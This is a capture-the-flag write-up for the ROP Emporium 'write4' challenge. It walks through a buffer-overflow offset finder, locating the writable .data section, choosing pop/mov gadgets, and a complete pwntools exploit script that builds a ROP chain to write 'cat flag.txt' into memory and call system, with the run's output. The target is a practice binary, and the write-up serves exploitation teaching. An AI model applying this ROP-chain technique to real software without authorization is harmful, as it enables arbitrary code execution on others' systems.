## Write4

### Challenge Description : Find and manipulate gadgets to construct an arbitrary write primitive and use it to learn where and how to get your data into process memory.

---

### HINT : On completing our usual checks for interesting strings and symbols in this binary we're confronted with the stark truth that our favourite string "/bin/cat flag.txt" is not present this time. Although you'll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we'll stick to the challenge goal which is learning how to get data into the target process's virtual address space via the magic of ROP.

---

So, our target for this challenge, is to write the string "cat flag.txt" somewhere in the memory and use that string to pass it to the system function, so that it is called. 

---

The first step as all ways, is checking the security, finding the vuln (in this case buffer overflow).

Since, we do the same step as all ways, I had to automate it

```
def get_offset32(elf):
    io = process(elf.path)
    io.sendline(cyclic(200))
    io.wait()
    core = io.corefile
    offset_addr = core.fault_addr
    offset = cyclic_find(offset_addr)
    info("OFFSET : %d" , offset )
    return offset
```

`get_offset32` sends a arbitrary long string to the binary, and waits for it to crash. Then, when it crashes, locates the source of the crash in the core file, which is stored at the fault address. Using the fault address, we locate the offset. 

Now, our next step is to find some location where we can write our string.

Using `readelf`, we can find all the sections in the elf, and hopefully find a section where we have write access. 

```
readelf write432 -S                                                   Sat 18 May 2019 19:54:21 IST
There are 31 section headers, starting at offset 0x196c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
  ...
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific
  ```
  Only the following sections have a write access. 

  I'd like to write in the .data section. 

  According to [TutorialsPoint](https://www.tutorialspoint.com/assembly_programming/assembly_memory_segments.htm) :
  ```
  Data segment − It is represented by .data section and the .bss. The .data section is used to declare the memory region, where data elements are stored for the program. This section cannot be expanded after the data elements are declared, and it remains static throughout the program.
``` 
That's perfect!

Let's check, where should we write in the `.data` section. We don't want to write over any already declared data elements. 

```
readelf write432 -x .data                     
Hex dump of section '.data':
  0x0804a028 00000000 00000000                   ........
  ```

It's empty. Perfect!

---

Now we know the what, and the where. The last and the most important one How?

We need gadgets to do that for us. Hence, `ROPGadget` comes into the picture. Since we can only write to the stack, and we need to mov the data into `.data` section, we are looking for gadgets with `pop` or `mov` instruction. 

```
ROPgadget --binary write432 --only "nop|mov|pop|ret"      243ms  Sat 18 May 2019 20:27:10 IST
Gadgets information
============================================================
0x08048547 : mov al, byte ptr [0xc9010804] ; ret
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080484b0 : mov ebx, dword ptr [esp] ; ret
0x0804866f : nop ; mov dword ptr [edi], ebp ; ret
0x080484af : nop ; mov ebx, dword ptr [esp] ; ret
0x0804866e : nop ; nop ; mov dword ptr [edi], ebp ; ret
0x080484ad : nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x0804866c : nop ; nop ; nop ; mov dword ptr [edi], ebp ; ret
0x080484ab : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
0x0804866a : nop ; nop ; nop ; nop ; mov dword ptr [edi], ebp ; ret
0x080486db : pop ebp ; ret
0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483e1 : pop ebx ; ret
0x080486da : pop edi ; pop ebp ; ret
0x080486d9 : pop esi ; pop edi ; pop ebp ; ret
0x0804819d : ret
0x080484fe : ret 0xeac1

Unique gadgets found: 17
```

We can potentially use the gadgets `0x08048670` & `0x080486da`

`0x080486da` pops the first 4 bytes of the stack into `edi`, and pops the next 4 bytes of the stack in `ebp`

`0x08048670` moves the contents of `ebp` into the location pointed by `edi`

So, we'd like to write the address of data section into the stack, followed by a string. Then call pop_gadget, which writes the address of data into `edi` and string into `ebp`. Then call the `mov_gadget` which moves the string into data section. Do this recursively with string broken into 4bytes at a time. `ebp` & `edi` both hold 4bytes. 


At last, call the system function with the string in data section as our argument. 

exploit.py
```
from pwn import *

def get_offset32(elf):
    io = process(elf.path)
    io.sendline(cyclic(200))
    io.wait()
    core = io.corefile
    offset_addr = core.fault_addr
    offset = cyclic_find(offset_addr)
    info("OFFSET : %d" , offset )
    return offset



elf = context.binary = ELF("write432")
offset = get_offset32(elf)

data_section = elf.get_section_by_name(".data").header.sh_addr
info(".data : %#x",data_section)
data_section = data_section

system = elf.symbols.system
info("System : %#x",system)

mov_gadget = p32(0x08048670)
pop_gadget = p32(0x080486da)

instruction = "cat flag.txt"

payload = 'A'*offset
payload += pop_gadget
payload += p32(data_section)
payload += instruction[0:4]
payload += mov_gadget

payload += pop_gadget
payload += p32(data_section+4)
payload += instruction[4:8]
payload += mov_gadget

payload += pop_gadget
payload += p32(data_section+8)
payload += instruction[8:12]
payload += mov_gadget

payload += p32(system)
payload += "JUNK"
payload += p32(data_section)

io = process(elf.path)
io.recvuntil('>')
io.sendline(payload)
flag = io.recvline()
success("FLAG : %s", flag)
```

OUTPUT

```
[*] '/ropemporium/write4_SOLVED/again/write432'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[x] Starting local process '/ropemporium/write4_SOLVED/again/write432'
[+] Starting local process '/ropemporium/write4_SOLVED/again/write432': pid 18033
[*] Process '/ropemporium/write4_SOLVED/again/write432' stopped with exit code -11 (SIGSEGV) (pid 18033)
[x] Parsing corefile...
[*] '/ropemporium/write4_SOLVED/again/core.18033'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xffe94ae0
    Exe:       '/ropemporium/write4_SOLVED/again/write432' (0x8048000)
    Fault:     0x6161616c
[+] Parsing corefile...: Done
[*] OFFSET : 44
[*] .data : 0x804a028
[*] System : 0x8048430
[x] Starting local process '/ropemporium/write4_SOLVED/again/write432'
[+] Starting local process '/ropemporium/write4_SOLVED/again/write432': pid 18050
[+] FLAG :  ROPE{a_placeholder_32byte_flag!}
[*] Stopped process '/ropemporium/write4_SOLVED/again/write432' (pid 18050)
```

